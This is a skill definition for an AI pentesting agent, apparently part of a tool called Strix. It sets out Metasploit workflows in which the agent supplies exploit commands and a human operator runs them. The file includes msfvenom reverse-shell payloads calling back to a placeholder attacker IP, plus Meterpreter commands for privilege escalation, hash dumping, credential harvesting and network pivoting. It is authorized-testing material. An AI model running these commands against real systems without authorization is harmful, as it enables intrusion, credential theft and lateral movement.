---
name: metasploit
description: Operator-assisted Metasploit Framework workflows for exploit execution, payload delivery, post-exploitation, and pivoting
category: tools
tags: [exploitation, post-exploitation, pivoting, operator-assisted]
---

# Metasploit Framework

Exploitation framework for vulnerability verification, payload delivery, post-exploitation, and pivoting. The agent guides exploit selection and configuration; the operator executes in msfconsole.

## When to Request

- After confirming a vulnerability to verify exploitability with a working exploit
- When a known CVE is identified and a Metasploit module exists
- For post-exploitation tasks (privilege escalation, credential harvesting, pivoting)
- Payload generation for client-side or social engineering attacks

## Operator-Assisted Workflow

1. Agent identifies a confirmed or likely vulnerability with a known Metasploit module
2. Agent provides full msfconsole commands (module, options, payload, target)
3. Operator runs in msfconsole and reports session/output
4. Agent analyzes results and directs post-exploitation or pivoting
5. Agent documents the full exploit chain for reporting

## Key Commands

### Search and Select Module
```
msfconsole -q
search type:exploit name:apache
use exploit/multi/http/apache_normalize_path_rce
info
show options
show targets
show payloads
```

### Configure and Run Exploit
```
use exploit/MODULE_PATH
set RHOSTS TARGET
set RPORT PORT
set LHOST ATTACKER_IP
set LPORT 4444
set PAYLOAD payload/type
exploit
```

### Common Exploit Categories
```
# Web application
use exploit/multi/http/MODULE
use exploit/unix/webapp/MODULE

# SMB/Windows
use exploit/windows/smb/MODULE

# SSH
use auxiliary/scanner/ssh/ssh_login

# Database
use exploit/multi/postgres/postgres_createlang
use exploit/windows/mssql/mssql_payload
```

### Payload Generation
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o payload.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o payload.elf
msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 -f war -o shell.war
```

### Post-Exploitation (Meterpreter)
```
sysinfo
getuid
getsystem
hashdump
run post/multi/recon/local_exploit_suggester
run post/windows/gather/credentials/credential_collector
portfwd add -l LOCAL_PORT -p REMOTE_PORT -r REMOTE_HOST
run autoroute -s SUBNET/MASK
```

### Auxiliary Scanning
```
use auxiliary/scanner/http/http_version
use auxiliary/scanner/smb/smb_ms17_010
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS TARGET_RANGE
run
```

## Output Analysis

- **Session opened** -- successful exploitation; document the exploit path and proceed to post-exploitation
- **Exploit failed** -- note why (patched, wrong target, firewall); try alternate modules or payloads
- **Credentials harvested** -- test for reuse across services and accounts
- **Network routes** -- identify pivoting opportunities to reach internal networks
- **Local exploit suggestions** -- prioritize privilege escalation paths
- **Auxiliary scan results** -- confirm/deny vulnerability presence at scale

## Integration with Strix

- Agent identifies CVEs from Nmap/Nuclei output and maps to Metasploit modules
- Successful shells feed back intelligence (internal IPs, credentials, configs) for further Strix testing
- Pivoted network access expands Strix scope to internal web applications
- Credential harvesting results inform authentication testing across all discovered services

## Operator Help

To provide tool output for this request, save the full command output to the
HIL inbox file indicated by the agent:

```
strix/hil/inbox/resp_<TASK_ID>.txt
```

You can also pipe output directly:

```
metasploit [OPTIONS] TARGET > strix/hil/inbox/resp_<TASK_ID>.txt
```

The agent will automatically detect and parse the response.  See the
`HIL_INBOX_PATH` environment variable to customise the inbox location.
